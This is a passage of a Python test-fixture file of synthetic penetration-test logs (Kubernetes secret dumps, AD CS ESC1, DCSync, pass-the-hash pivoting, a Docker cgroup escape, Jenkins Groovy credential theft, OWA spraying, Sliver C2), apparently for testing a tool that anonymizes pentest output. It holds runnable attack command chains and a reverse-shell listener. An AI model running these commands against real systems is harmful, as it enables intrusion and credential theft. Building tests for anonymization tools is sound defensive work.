vortex-smtp-config            Opaque              2      12d
sh.helm.release.v1.vortex.v8  helm.sh/release.v1  1      3d

$ kubectl get secret vortex-db-credentials -n producao -o yaml
apiVersion: v1
kind: Secret
metadata:
  name: vortex-db-credentials
  namespace: producao
data:
  DB_HOST: cG9zdGdyZXMudm9ydGV4LmludGVybmFs     # postgres.vortex.internal
  DB_USER: dm9ydGV4X3Byb2Q=                       # vortex_prod
  DB_PASS: VjByVGV4UHIwZCEyMDI0                   # V0rTexPr0d!2024

$ kubectl exec -it vortex-api-7d9f8b-xkp2q -n producao -- env | grep -i secret
JWT_SECRET=vortex_jwt_HS256_secret_prod_2024!
REDIS_PASS=V0rtexR3d1s#2024

$ kubectl get pods -n producao -o wide
NAME                         READY  STATUS   IP            NODE
vortex-api-7d9f8b-xkp2q     1/1    Running  10.244.2.15   node-prod-01.vortex.internal
vortex-worker-5c9d6-mnp3r    1/1    Running  10.244.2.16   node-prod-02.vortex.internal
vortex-postgres-0            1/1    Running  10.244.2.20   node-prod-01.vortex.internal
""",
    must_anonymize=[
        "vortex-db-credentials", "vortex-api-jwt-secret", "vortex-smtp-config",
        "vortex", "producao",
        "postgres.vortex.internal",
        "vortex_prod", "V0rTexPr0d!2024",
        "vortex_jwt_HS256_secret_prod_2024!", "V0rtexR3d1s#2024",
        "vortex-api-7d9f8b-xkp2q", "vortex-worker-5c9d6-mnp3r", "vortex-postgres-0",
        "10.244.2.15", "10.244.2.16", "10.244.2.20",
        "node-prod-01.vortex.internal", "node-prod-02.vortex.internal",
    ],
    safe_to_keep=[
        "kubectl", "helm", "kubernetes", "Secret", "Opaque",
        "DB_HOST", "DB_USER", "DB_PASS", "JWT_SECRET", "REDIS_PASS",
        "Running", "Ready",
    ],
)

CERTIPY_ADCS = PentestFixture(
    name="certipy_adcs_attack",
    description="Certipy ESC1 attack — AD CS misconfigured template, cert theft, PKINIT",
    text="""\
certipy find -u lucas.pereira@fortuna.corp -p 'Fortuna#2024' -dc-ip 10.20.30.5

Certificate Authorities
  0
    CA Name                             : FORTUNA-CA
    DNS Name                            : ca01.fortuna.corp
    Certificate Subject                 : CN=FORTUNA-CA, DC=fortuna, DC=corp
    Certificate Validity                : 2023-01-01 to 2033-01-01

Vulnerable certificate templates:
  0
    Template Name                       : FortunaUserAuth
    Enabled                             : True
    Client Authentication               : True
    Enrollee Supplies Subject           : True   [ESC1 VULNERABLE]
    Authorized Signatures Required      : 0

certipy req -u lucas.pereira@fortuna.corp -p 'Fortuna#2024' \\
    -ca FORTUNA-CA -template FortunaUserAuth \\
    -upn administrator@fortuna.corp -dc-ip 10.20.30.5

[*] Saved certificate and private key to 'administrator.pfx'

certipy auth -pfx administrator.pfx -dc-ip 10.20.30.5
[*] Got hash for 'administrator@fortuna.corp': aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
""",
    must_anonymize=[
        "lucas.pereira@fortuna.corp", "lucas.pereira",
        "Fortuna#2024",
        "fortuna.corp", "FORTUNA-CA", "ca01.fortuna.corp",
        "FortunaUserAuth",
        "administrator@fortuna.corp",
        "10.20.30.5",
        "aad3b435b51404eeaad3b435b51404ee",
        "8846f7eaee8fb117ad06bdd830b7586c",
    ],
    safe_to_keep=[
        "certipy", "ESC1", "NTLM",
        "Client Authentication", "Enrollee Supplies Subject",
        "pfx", "administrator",
    ],
)

GCP_PENTEST = PentestFixture(
    name="gcp_pentest",
    description="GCP service account key theft — IAM enum, bucket exfil, metadata abuse",
    text="""\
$ curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
{"access_token":"ya29.c.b0AXv0zTOmega-prod-sa-token-XXXX_realtoken_here","token_type":"Bearer","expires_in":3599}

$ gcloud config set account omega-deploy@omega-producao-441210.iam.gserviceaccount.com
$ gcloud projects list
PROJECT_ID                  NAME             PROJECT_NUMBER
omega-producao-441210       Omega Produção   441210987654
omega-staging-332109        Omega Staging    332109876543

$ gsutil ls gs://omega-prod-backups/
gs://omega-prod-backups/dumps/2024-03-01-full.sql.gz
gs://omega-prod-backups/secrets/prod.env
gs://omega-prod-backups/keys/omega-deploy-sa.json

$ cat omega-deploy-sa.json
{
  "type": "service_account",
  "project_id": "omega-producao-441210",
  "private_key_id": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0",
  "client_email": "omega-deploy@omega-producao-441210.iam.gserviceaccount.com",
  "client_id": "123456789012345678901"
}
""",
    must_anonymize=[
        "ya29.c.b0AXv0zTOmega-prod-sa-token-XXXX_realtoken_here",
        "omega-deploy@omega-producao-441210.iam.gserviceaccount.com",
        "omega-producao-441210", "omega-staging-332109",
        "441210987654", "332109876543",
        "omega-prod-backups",
        "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0",
        "123456789012345678901",
        "Omega Produção", "Omega Staging",
    ],
    safe_to_keep=[
        "gcloud", "gsutil", "curl", "Bearer", "access_token",
        "service_account", "project_id", "private_key_id",
        "computeMetadata", "169.254.169.254",
    ],
)

BLOODHOUND_PATHS = PentestFixture(
    name="bloodhound_attack_paths",
    description="BloodHound shortest path output + custom AD group names revealing org structure",
    text="""\
BloodHound CE — Shortest Path to Domain Admin

Path 1: carlos.mendes@solaris.io → Domain Admin
  carlos.mendes@solaris.io
    -[MemberOf]→ GRP_TI_HELPDESK@SOLARIS.IO
    -[GenericAll]→ GRP_SERVIDORES_PRD@SOLARIS.IO
    -[GenericAll]→ svc_deploy@SOLARIS.IO
    -[MemberOf]→ Domain Admins@SOLARIS.IO

Path 2: Via AS-REP Roasting
  No pre-auth required: ana.beatriz@solaris.io
  $krb5asrep$23$ana.beatriz@SOLARIS.IO:3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c$...

High-value targets:
  Computer: ERP-SERVER-01.solaris.local (OS: Windows Server 2019, LAPS: disabled)
  Computer: FIN-WORKSTATION-07.solaris.local (session: patricia.lima@solaris.io)
  Group:    GRP_FINANCEIRO_DIRETORES@SOLARIS.IO (high-value, 3 members)

Kerberoastable:
  svc_erp (SPN: MSSQLSvc/erp-db.solaris.local:1433)  — Password: Solaris@ERP2024!
""",
    must_anonymize=[
        "carlos.mendes@solaris.io", "carlos.mendes",
        "GRP_TI_HELPDESK@SOLARIS.IO", "GRP_SERVIDORES_PRD@SOLARIS.IO",
        "svc_deploy@SOLARIS.IO", "SOLARIS.IO", "solaris.io",
        "ana.beatriz@solaris.io", "ana.beatriz",
        "3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c",
        "ERP-SERVER-01.solaris.local", "FIN-WORKSTATION-07.solaris.local",
        "solaris.local", "patricia.lima@solaris.io",
        "GRP_FINANCEIRO_DIRETORES@SOLARIS.IO",
        "svc_erp", "erp-db.solaris.local",
        "Solaris@ERP2024!",
    ],
    safe_to_keep=[
        "BloodHound", "MemberOf", "GenericAll",
        # "Domain Admins" appears as "Domain Admins@SOLARIS.IO" — email regex correctly
        # anonymizes it; the group name alone can't be preserved in @-notation context
        "AS-REP", "LAPS", "MSSQLSvc",
        "Windows Server 2019", "krb5asrep",
    ],
)

WIFI_PENTEST = PentestFixture(
    name="wifi_pentest",
    description="WPA2 enterprise crack + rogue AP — airodump, hostapd-wpe, captured credentials",
    text="""\
airodump-ng wlan0mon

 BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER AUTH  ESSID
 AA:BB:CC:11:22:33  -45      847  12054   6  540  WPA2 CCMP   MGT   CORPORATIVO-SOLAR
 DD:EE:FF:44:55:66  -71      312    892  11  130  WPA2 CCMP   PSK   SOLAR_VISITANTES

[hostapd-wpe] Captured RADIUS credentials:
  username: SOLAR\\fabio.castro
  challenge: 1a2b3c4d5e6f7a8b
  response:  9f8e7d6c5b4a3928f1e0d2c3b4a59687

[hostapd-wpe] Captured RADIUS credentials:
  username: SOLAR\\vanessa.rocha
  challenge: a1b2c3d4e5f6a7b8
  response:  1234567890abcdef1234567890abcdef

asleap -C 1a2b3c4d5e6f7a8b -R 9f8e7d6c5b4a3928f1e0d2c3b4a59687 -W /usr/share/wordlists/rockyou.txt
hash bytes:         9f8e7d6c
NT hash:            5835048ce94ad0564e29a924a03510ef
password:           Solar@WiFi2024!

ESSID: CORPORATIVO-SOLAR  →  PSK: SolarCorpWPA2#Key
""",
    must_anonymize=[
        "AA:BB:CC:11:22:33", "DD:EE:FF:44:55:66",
        "CORPORATIVO-SOLAR", "SOLAR_VISITANTES", "SOLAR",
        "fabio.castro", "vanessa.rocha",
        "1a2b3c4d5e6f7a8b", "9f8e7d6c5b4a3928f1e0d2c3b4a59687",
        "a1b2c3d4e5f6a7b8", "1234567890abcdef1234567890abcdef",
        "5835048ce94ad0564e29a924a03510ef",
        "Solar@WiFi2024!", "SolarCorpWPA2#Key",
    ],
    safe_to_keep=[
        "airodump-ng", "hostapd-wpe", "asleap", "WPA2", "CCMP", "RADIUS",
        "wlan0mon", "rockyou.txt", "MGT", "PSK", "BSSID", "ESSID",
    ],
)

PIVOTING_LATERAL = PentestFixture(
    name="pivoting_lateral_movement",
    description="Network pivoting through compromised host — chisel tunnel, proxychains, lateral SMB",
    text="""\
# Compromised: webserver01.deltacorp.local (10.30.0.15) — pivot para rede interna

# No atacante (10.10.10.1)
./chisel server -p 9001 --reverse

# Na máquina comprometida
./chisel client 10.10.10.1:9001 R:socks

# /etc/proxychains4.conf atualizado:
[ProxyList]
socks5 127.0.0.1 1080

# Varredura interna via proxychains
proxychains nmap -sT -Pn -p 445,3389,22 10.30.1.0/24
Nmap scan report for 10.30.1.5   (delta-dc01.deltacorp.local)
  445/tcp open  microsoft-ds
Nmap scan report for 10.30.1.10  (delta-erp.deltacorp.local)
  3389/tcp open  ms-wbt-server

# Pass-the-Hash lateral para DC
proxychains crackmapexec smb 10.30.1.5 -u administrator -H 5f4dcc3b5aa765d61d8327deb882cf99 --shares
SMB  10.30.1.5  445  DELTA-DC01  [+] deltacorp.local\\administrator (Pwn3d!)

# Dump via secretsdump
proxychains impacket-secretsdump -hashes :5f4dcc3b5aa765d61d8327deb882cf99 \\
    deltacorp.local/administrator@10.30.1.5
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
delta_svc:1008:aad3b435b51404eeaad3b435b51404ee:3c4f5e6a7b8c9d0e1f2a3b4c5d6e7f8a:::
""",
    must_anonymize=[
        "webserver01.deltacorp.local", "10.30.0.15",
        "deltacorp.local", "deltacorp",
        "10.30.1.5", "delta-dc01.deltacorp.local", "DELTA-DC01",
        "10.30.1.10", "delta-erp.deltacorp.local",
        "10.30.1.0/24", "10.10.10.1",
        "5f4dcc3b5aa765d61d8327deb882cf99",
        "aad3b435b51404eeaad3b435b51404ee",
        "3c4f5e6a7b8c9d0e1f2a3b4c5d6e7f8a",
        "delta_svc",
    ],
    safe_to_keep=[
        "chisel", "proxychains", "nmap", "crackmapexec", "impacket",
        "Pass-the-Hash", "secretsdump", "socks5", "SMB", "445", "3389",
    ],
)


DCSYNC_DUMP = PentestFixture(
    name="dcsync_secretsdump",
    description="DCSync via secretsdump.py — full NTDS dump with krbtgt and user hashes",
    text="""\
impacket-secretsdump -just-dc helios.corp/administrator:'Helios@Admin2024!'@10.50.1.5

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
helios.corp\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::
helios.corp\\Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
helios.corp\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c3b99b3f9e7e8df93a7a44d3a17cc40e:::
helios.corp\\carlos.mendez:1105:aad3b435b51404eeaad3b435b51404ee:4f87e2e6c96f3cf34f0f71ba7a88b8f4:::
helios.corp\\ana.silva:1106:aad3b435b51404eeaad3b435b51404ee:7b4e2a1c0d3f5e8a9b2c4d6e0f1a3b5c:::
helios.corp\\svc_backup:1108:aad3b435b51404eeaad3b435b51404ee:e2b4c6d8f0a2c4e6f8a0b2d4f6a8c0e2:::
helios.corp\\HELIOS-DC01$:1001:aad3b435b51404eeaad3b435b51404ee:9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d:::
[*] Kerberos keys grabbed
helios.corp\\krbtgt:aes256-cts-hmac-sha1-96:3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c
helios.corp\\Administrator:aes256-cts-hmac-sha1-96:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b
[*] Cleaning up...
""",
    must_anonymize=[
        "helios.corp", "10.50.1.5",
        "Helios@Admin2024!",
        "a87f3a337d73085c45f9416be5787d86",
        "c3b99b3f9e7e8df93a7a44d3a17cc40e",
        "4f87e2e6c96f3cf34f0f71ba7a88b8f4",
        "7b4e2a1c0d3f5e8a9b2c4d6e0f1a3b5c",
        "e2b4c6d8f0a2c4e6f8a0b2d4f6a8c0e2",
        "9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d",
        "carlos.mendez", "ana.silva", "svc_backup",
        "HELIOS-DC01",
        "3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c",
        "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
    ],
    safe_to_keep=[
        "impacket", "secretsdump", "DRSUAPI", "NTDS",
        "krbtgt", "aes256-cts-hmac-sha1-96",
    ],
)


MSSQL_PENTEST = PentestFixture(
    name="mssql_xp_cmdshell",
    description="MSSQL exploitation via xp_cmdshell after SA login — command execution",
    text="""\
impacket-mssqlclient pratica.local/sa:Pr4tica$QL2024!@10.20.5.30 -windows-auth

Impacket v0.11.0 - Copyright 2023 Fortra
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ACK: Result: 1 - Microsoft SQL Server (160 15000)
[!] Press help for extra shell commands
SQL (PRATICA\\sa  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
[*] INFO(PRATICA-SQL01\\SQLEXPRESS): Line 1: Configuration option 'xp_cmdshell' changed from 0 to 1.
SQL (PRATICA\\sa  dbo@master)> xp_cmdshell 'whoami'
output
--------------------
pratica\\nt service\\mssqlserver

SQL (PRATICA\\sa  dbo@master)> xp_cmdshell 'ipconfig /all'
output
--------------------
Windows IP Configuration

   Host Name . . . . . . . . . . . . : PRATICA-SQL01
   Primary Dns Suffix  . . . . . . . : pratica.local
   IPv4 Address. . . . . . . . . . . : 10.20.5.30
   Default Gateway . . . . . . . . . : 10.20.5.1
   DNS Servers . . . . . . . . . . . : 10.20.5.5

SQL (PRATICA\\sa  dbo@master)> SELECT name, password_hash FROM sys.sql_logins;
name           password_hash
-----------    -----------------------------------
sa             0x0200FA1C3A5B6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E
devuser        0x02004B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A
""",
    must_anonymize=[
        "pratica.local", "10.20.5.30", "10.20.5.5", "10.20.5.1",
        "Pr4tica$QL2024!",
        "PRATICA-SQL01", "PRATICA",
        "0x0200FA1C3A5B6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E",
        "0x02004B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A",
        "devuser",
    ],
    safe_to_keep=[
        "impacket", "mssqlclient", "xp_cmdshell", "sp_configure",
        "RECONFIGURE", "sa", "master", "SQLEXPRESS",
        "Microsoft SQL Server", "us_english",
    ],
)


DOCKER_ESCAPE = PentestFixture(
    name="docker_cgroup_escape",
    description="Docker container escape via cgroup release_agent — host process access",
    text="""\
# Inside container — pivot to host via cgroup notify_on_release
root@3f8a92b1c4d5:/# cat /proc/1/cgroup
12:memory:/docker/3f8a92b1c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1
root@3f8a92b1c4d5:/# cat /etc/hostname
3f8a92b1c4d5

# Exploit cgroup release_agent
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)
# host_path = /var/lib/docker/overlay2/3f8a92b1c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1/diff
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo 'cat /etc/shadow > '"$host_path"'/shadow_out' >> /cmd
chmod a+x /cmd && sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"

# /etc/shadow from host:
root:$6$NuvemProd$3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c:19600:0:99999:7:::
ubuntu:$6$NuvemProd$c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3:19234:0:99999:7:::
nuvem_deploy:$6$xyz$9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a:19400:0:99999:7:::
jenkins:$6$xyz$1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d:19300:0:99999:7:::

# Attacker listener
root@nuvem-attack-01:~# nc -lvnp 4444
Connection received on 172.16.20.5 49321 from container
root@nuvem-prod-01:/# id && hostname
uid=0(root) gid=0(root) groups=0(root)
nuvem-prod-01
""",
    must_anonymize=[
        "3f8a92b1c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1",
        "3f8a92b1c4d5",
        "nuvem_deploy", "nuvem-prod-01", "nuvem-attack-01",
        "172.16.20.5",
        "$6$NuvemProd$3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c",
        "$6$NuvemProd$c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3",
    ],
    safe_to_keep=[
        "docker", "cgroup", "release_agent", "overlay2",
        "ubuntu", "jenkins", "root", "/etc/shadow", "/proc/1/cgroup",
    ],
)


JENKINS_RCE = PentestFixture(
    name="jenkins_script_rce",
    description="Jenkins Script Console Groovy RCE — reverse shell + credential extraction",
    text="""\
# Jenkins Script Console — http://10.30.8.20:8080/script
# Groovy reverse shell executed by operator

def cmd = "id && hostname && cat /var/jenkins_home/secrets/initialAdminPassword".execute()
println cmd.text

uid=113(jenkins) gid=118(jenkins) groups=118(jenkins)
stellartech-ci-01
a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2

# Reading Jenkins credentials store
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,
    Jenkins.instance, null, null)
creds.each { println it.id + " : " + it.username + " : " + it.password }

stellartech-deploy-key : deploy_bot : StellarDeploy!2024
stellartech-db-prod    : db_admin   : ProdDB#Stellar99!
github-pat             : stellartech-bot : ghp_xxK9mP2qLnRvT4wYzAb3StellarBot1234

# SSH access to internal host
[stellartech-ci-01]$ ssh -i /var/jenkins_home/.ssh/id_rsa deploy_bot@10.30.8.50
Last login: Mon Apr 14 09:31:12 2024 from 10.30.8.20
deploy_bot@stellartech-app-01:~$ cat /opt/stellartech/config/db.conf
DB_HOST=db-primary.stellartech.internal
DB_USER=stellarapp_prod
DB_PASS=St3llar#DBPr0d2024
""",
    must_anonymize=[
        "10.30.8.20", "10.30.8.50",
        "stellartech-ci-01", "stellartech-app-01",
        "stellartech.internal", "stellartech",
        "a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2",
        "StellarDeploy!2024", "ProdDB#Stellar99!", "St3llar#DBPr0d2024",
        "ghp_xxK9mP2qLnRvT4wYzAb3StellarBot1234",
        "deploy_bot", "db_admin", "stellartech-bot", "stellarapp_prod",
        "db-primary.stellartech.internal",
    ],
    safe_to_keep=[
        "jenkins", "groovy", "Jenkins", "CredentialsProvider",
        "initialAdminPassword", "/var/jenkins_home",
        "StandardUsernamePasswordCredentials",
    ],
)


NETEXEC_SMB = PentestFixture(
    name="netexec_smb_enumeration",
    description="NetExec (nxc) SMB enumeration — share listing, user spray, LSA dump",
    text="""\
nxc smb 10.40.0.0/24 --gen-relay-list relay_targets.txt
NXC  10.40.0.5   445  ORION-DC01      [*] Windows Server 2022 (name:ORION-DC01) (domain:orion.corp) (signing:True)
NXC  10.40.0.10  445  ORION-WEB01     [*] Windows Server 2019 (name:ORION-WEB01) (domain:orion.corp) (signing:False) [RELAY TARGET]
NXC  10.40.0.15  445  ORION-FILE01    [*] Windows Server 2019 (name:ORION-FILE01) (domain:orion.corp) (signing:False) [RELAY TARGET]

nxc smb 10.40.0.5 -u felipe.ramos -p 'Orion@2024!' --shares
NXC  10.40.0.5   445  ORION-DC01  [+] orion.corp\\felipe.ramos:Orion@2024! (Pwn3d!)
NXC  10.40.0.5   445  ORION-DC01  [*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$          READ,WRITE      Remote Admin
C$              READ,WRITE      Default share
IPC$            READ            Remote IPC
SYSVOL          READ            Logon server share
ORION-BACKUP    READ            Backup share — Orion Infrastructure

nxc smb 10.40.0.5 -u felipe.ramos -p 'Orion@2024!' --lsa
NXC  10.40.0.5   445  ORION-DC01  [+] Dumping LSA secrets
NXC  10.40.0.5   445  ORION-DC01  ORION\\ORION-DC01$:plain_password_hex:b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0
NXC  10.40.0.5   445  ORION-DC01  ORION\\ORION-DC01$:des-cbc-md5:3c4d5e6f7a8b9c0d
NXC  10.40.0.5   445  ORION-DC01  dpapi_machinekey:0xf0e1d2c3b4a5968778695a4b3c2d1e0f
NXC  10.40.0.5   445  ORION-DC01  dpapi_userkey:0xa1b2c3d4e5f6071829384a5b6c7d8e9f
""",
    must_anonymize=[
        "10.40.0.0/24", "10.40.0.5", "10.40.0.10", "10.40.0.15",
        "orion.corp", "ORION", "ORION-DC01", "ORION-WEB01", "ORION-FILE01",
        "felipe.ramos", "Orion@2024!",
        "b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0",
        "3c4d5e6f7a8b9c0d",
        "0xf0e1d2c3b4a5968778695a4b3c2d1e0f",
        "0xa1b2c3d4e5f6071829384a5b6c7d8e9f",
        "ORION-BACKUP",
    ],
    safe_to_keep=[
        "nxc", "SMB", "SYSVOL", "ADMIN$", "IPC$", "C$",
        "Windows Server 2022", "Windows Server 2019",
        "READ", "WRITE", "signing", "RELAY TARGET",
    ],
)


LDAP_ENUM = PentestFixture(
    name="ldap_enumeration",
    description="ldapsearch + ldapdomaindump enumeration — users, groups, GPOs, trusts",
    text="""\
ldapsearch -x -H ldap://10.60.1.5 -D 'quantum\\diana.costa' -w 'Quantum#2024' \\
  -b 'DC=quantum,DC=local' '(objectClass=user)' sAMAccountName mail memberOf

# dn: CN=diana.costa,OU=Users,DC=quantum,DC=local
sAMAccountName: diana.costa
mail: diana.costa@quantum.local
memberOf: CN=Domain Admins,CN=Users,DC=quantum,DC=local

# dn: CN=pedro.alves,OU=IT,DC=quantum,DC=local
sAMAccountName: pedro.alves
mail: pedro.alves@quantum.local
memberOf: CN=IT_HELPDESK,OU=Groups,DC=quantum,DC=local

# dn: CN=svc_gitlab,OU=ServiceAccounts,DC=quantum,DC=local
sAMAccountName: svc_gitlab
memberOf: CN=ServerOperators,CN=Builtin,DC=quantum,DC=local
servicePrincipalName: HTTP/gitlab.quantum.local

ldapdomaindump -u 'quantum\\diana.costa' -p 'Quantum#2024' 10.60.1.5 -o /tmp/quantum_ldap/

[+] Connecting to host...
[+] Binding to host
[*] Starting domain dump
[+] Domain users      : /tmp/quantum_ldap/domain_users.json
[+] Domain computers  : /tmp/quantum_ldap/domain_computers.json
[+] Domain trusts     : quantum.local  →  external.partner.com (EXTERNAL)

[i] Trust: quantum.local → external.partner.com  Direction: BIDIRECTIONAL
""",
    must_anonymize=[
        "10.60.1.5", "quantum.local", "quantum", "QUANTUM",
        "diana.costa", "diana.costa@quantum.local",
        "Quantum#2024",
        "pedro.alves", "pedro.alves@quantum.local",
        "svc_gitlab", "gitlab.quantum.local",
        "/tmp/quantum_ldap/",
        "external.partner.com",
        "IT_HELPDESK",
    ],
    safe_to_keep=[
        "ldapsearch", "ldapdomaindump", "ldap",
        "sAMAccountName", "memberOf", "servicePrincipalName",
        "Domain Admins", "ServerOperators", "objectClass",
        "BIDIRECTIONAL", "EXTERNAL",
    ],
)


EXCHANGE_OWA = PentestFixture(
    name="exchange_owa_spray",
    description="Exchange OWA password spray + mailbox access via MailSniper/ruler",
    text="""\
# Password spray against OWA — mail.nexusbank.com.br
python3 spray.py -t https://mail.nexusbank.com.br/owa -U users.txt -p 'Nexus@2024' -d nexusbank.com.br

[2024-03-18 14:22:01] Testing Nexus@2024 against 423 accounts...
[HIT] joao.ferreira@nexusbank.com.br : Nexus@2024
[HIT] marcia.santos@nexusbank.com.br : Nexus@2024
[HIT] ti.suporte@nexusbank.com.br    : Nexus@2024

# ruler autodiscover enum
ruler --email joao.ferreira@nexusbank.com.br --password 'Nexus@2024' --verbose autodiscover
[*] autodiscover   : https://autodiscover.nexusbank.com.br/autodiscover/autodiscover.xml
[*] EWS URL        : https://mail.nexusbank.com.br/EWS/Exchange.asmx
[*] OAB URL        : https://mail.nexusbank.com.br/OAB/
[*] Server Version : Version 15.2 (Build 1118.7) — Exchange 2019 CU12

# MailSniper — read inbox
Invoke-SelfSearch -Mailbox joao.ferreira@nexusbank.com.br -ExchHostname mail.nexusbank.com.br \\
  -Terms "senha","password","vpn","token"

Subject: RE: VPN Credentials — ATUALIZAÇÃO
From: ti.suporte@nexusbank.com.br
To: joao.ferreira@nexusbank.com.br
Body excerpt: ...nova senha VPN: Nexus@VPN2024#...

Subject: DB credentials prod
From: dba_nexus@nexusbank.com.br
Body excerpt: ...PostgreSQL prod: nexus_prod / NxPr0dDB!2024...
""",
    must_anonymize=[
        "mail.nexusbank.com.br", "nexusbank.com.br",
        "joao.ferreira@nexusbank.com.br", "marcia.santos@nexusbank.com.br",
        "ti.suporte@nexusbank.com.br", "dba_nexus@nexusbank.com.br",
        "joao.ferreira", "marcia.santos", "ti.suporte", "dba_nexus",
        "Nexus@2024", "Nexus@VPN2024#", "NxPr0dDB!2024",
        "nexus_prod",
        "autodiscover.nexusbank.com.br",
    ],
    safe_to_keep=[
        "ruler", "MailSniper", "autodiscover", "EWS", "OAB",
        "Exchange 2019", "Version 15.2", "Build 1118.7",
    ],
)


# ── New scenario fixtures ─────────────────────────────────────────────────────

SLIVER_C2 = PentestFixture(
    name="sliver_c2_session",
    description="Sliver C2 framework — session table, beacon info, shell execution on Windows target",
    text="""\
[server] sliver > sessions

 ID         Name       Transport  Remote Address        Hostname     Username                  OS/Arch       Last Msg
========= ========== ========== ==================== ============ ========================= ============= =========
 6a1b2c3d  ANGRY_FOX  mtls       10.20.30.105:52341   HELIX-WS01   HELIX\\james.wilson        windows/amd64  3s
 7b2c3d4e  BOLD_MULE  mtls       10.20.30.5:51234     HELIX-DC01   HELIX\\svc_backup          windows/amd64  1m

[server] sliver > use 6a1b2c3d
[*] Active session ANGRY_FOX (HELIX-WS01)

[server] sliver (ANGRY_FOX) > info

       Implant Name: ANGRY_FOX
            OS/Arch: windows/amd64
           Hostname: HELIX-WS01
           Username: james.wilson
               PID: 4829
        Working Dir: C:\\Windows\\Temp

[server] sliver (ANGRY_FOX) > shell

HELIX-WS01 C:\\Windows\\Temp> whoami
helix\\james.wilson
HELIX-WS01 C:\\Windows\\Temp> ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0:
   IPv4 Address. . . . . . . . . . . : 10.20.30.105
   Default Gateway . . . . . . . . . : 10.20.30.1
HELIX-WS01 C:\\Windows\\Temp> net user james.wilson /domain
User name                    james.wilson
Full Name                    James Wilson
Password last set            3/10/2024 8:43:11 AM
Logon Server                 \\\\HELIX-DC01
""",
    must_anonymize=[
        "HELIX-WS01", "HELIX-DC01",
        "10.20.30.105", "10.20.30.5", "10.20.30.1",
        "james.wilson", "svc_backup",
        "HELIX",
        "James Wilson",
    ],
    safe_to_keep=[
        "sliver", "mtls", "sessions", "shell", "whoami", "ipconfig",
        "windows", "Administrators", "ANGRY_FOX", "BOLD_MULE",
    ],
)

TERRAFORM_STATE = PentestFixture(
    name="terraform_state_exposure",
    description="Terraform tfstate file found in S3 bucket — plaintext secrets and resource config",
    text="""\
{
  "version": 4,
  "terraform_version": "1.5.2",
  "resources": [
    {
      "type": "aws_instance",
      "name": "stratus-app-prod",
      "instances": [{
        "attributes": {
          "id": "i-0a1b2c3d4e5f67890",
          "private_ip": "10.50.1.45",
          "public_ip": "54.23.87.156",
          "tags": {
            "Name": "stratus-app-prod",
            "Owner": "devops@stratustech.io"
          }
        }
      }]
    },
    {
      "type": "aws_db_instance",
      "name": "stratus-rds-prod",
      "instances": [{
        "attributes": {
          "identifier": "stratus-rds-prod",
